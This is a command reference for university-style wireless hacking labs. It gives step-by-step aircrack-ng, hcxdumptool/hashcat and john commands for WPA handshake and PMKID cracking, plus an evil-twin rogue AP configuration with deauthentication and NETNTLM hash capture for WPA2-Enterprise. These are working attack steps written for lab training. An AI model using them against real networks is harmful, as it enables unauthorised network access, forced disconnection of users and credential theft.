# 🖥️ Wireless Hacking — Command Reference

> All commands used across the three lab modules. Run these on the Kali Linux VM.

---

## General

```bash
# View wireless interfaces
iwconfig

# SSH into your group leader's VM (use whenever opening a new tab or if SSH crashes)
ssh kali@<leader's IP address>
```

---

## Lab 1 — WPA Cracking (Aircrack-ng)

### Step 1 — Enable monitor mode and scan for targets
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0
sudo airodump-ng -c <channel> --bssid <Target BSSID> -w handshake wlan0
```

### Step 2 — Convert capture to hashcat format
```bash
sudo aircrack-ng -J hash -b <Target BSSID> handshake-01.cap
```

### Step 3 — Crack with dictionary attack
```bash
sudo aircrack-ng -w rockyou.txt -b <Target BSSID> handshake*.cap
```

---

## Lab 2 — WPA2 Cracking (PMKID Attack)

### Step 1 — Stop conflicting services
```bash
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
```

### Step 2 — Capture PMKID / EAPOL frames
```bash
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=7
```

### Step 3 — Convert to hashcat format
```bash
sudo hcxpcapngtool -o pmkid.hc22000 -E essidlist dumpfile.pcapng
```

### Step 4 — Extract the target hash
```bash
sudo vim pmkid2crack.hc22000
# Paste in the relevant PMKID hash line for your target
```

### Step 5 — Crack with Hashcat
```bash
hashcat -m 22000 pmkid2crack.hc22000 rockyou.txt
hashcat -m 22000 pmkid2crack.hc22000 rockyou.txt --show
```

---

## Lab 3 — WPA2 Enterprise (Evil Twin Attack)

### Step 1 — Scan for the target network
```bash
sudo airmon-ng check kill
sudo airodump-ng wlan0
sudo airodump-ng wlan0 -d <Target BSSID>
sudo airodump-ng --channel <channel> wlan0
```

### Step 2 — Configure the rogue AP
```bash
cd /etc/hostapd-mana
sudo vim AP.conf
```

**AP.conf contents:**
```
# Access Point specifications
interface=wlan1
ssid=EvilTwin
hw_mode=g
channel=11

wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3

# 802.1x authentication
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1

# hostapd-wpe certificate files
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# Credential capture
mana_wpe=1           # Enable WPE mode for credential interception
mana_eapsuccess=1    # Enable EAP success messages
```

### Step 3 — Start the rogue AP
```bash
sudo hostapd-mana AP.conf
```

### Step 4 — Force clients to connect to rogue AP (deauth attack)
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set channel <Target's channel>
sudo ip link set wlan0 up
sudo iw dev wlan0 info
aireplay-ng --deauth 5 -a <Target network BSSID> -c <client BSSID> wlan0 --ignore-negative-one
```

### Step 5 — Crack the captured NETNTLM hash
```bash
john --format=netntlm -w:rockyou.txt jtrhash.txt
```
